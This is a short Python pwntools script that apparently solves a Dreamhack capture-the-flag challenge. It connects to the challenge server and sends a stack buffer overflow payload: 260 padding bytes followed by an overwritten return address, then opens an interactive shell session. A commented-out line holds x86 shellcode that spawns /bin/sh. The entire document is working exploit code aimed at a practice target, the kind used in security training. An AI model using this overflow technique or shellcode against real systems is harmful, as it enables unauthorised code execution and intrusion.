from pwn import *

p = remote("host1.dreamhack.games", 14235)

ret_address = int(b"0x080485db",16)
print(ret_address)

#code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
code = b"\x80"*260
code += p32(ret_address)

p.send(code)
p.interactive()
p.close()